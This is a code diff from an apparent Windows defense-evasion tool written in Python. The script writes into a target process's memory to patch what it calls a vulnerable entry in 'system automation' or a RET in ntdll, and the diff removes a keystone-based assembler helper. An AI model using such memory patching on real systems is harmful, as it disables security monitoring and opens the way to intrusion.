@@ -2,7 +2,6 @@ from ctypes import *
 from ctypes.wintypes import *
 import struct
 import psutil
-from keystone import *
 import time
 class MainSetup:
     #ProcessAccessRights directly from microsoft https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights 
@@ -108,13 +107,6 @@ def writetomem(handle,address,whattowrite):
         print(f"[-] Error in write {MainSetup.KERNEL32.GetLastError()}")
     else:
         print("[+] Patch successfull")
-
-#assemble the instructions into python bytes using keystone-engine (RTFM!)
-def assemble(asm_code):
-    ks = Ks(KS_ARCH_X86, KS_MODE_64)
-    encoding, _ = ks.asm(asm_code)
-    xiggers = bytes(encoding)
-    return ''.join(f'\\x{b:02x}' for b in xiggers)
 
 
 #function to readfrommem to find be it the RET in ntdll or the vulnerable entry in system automation
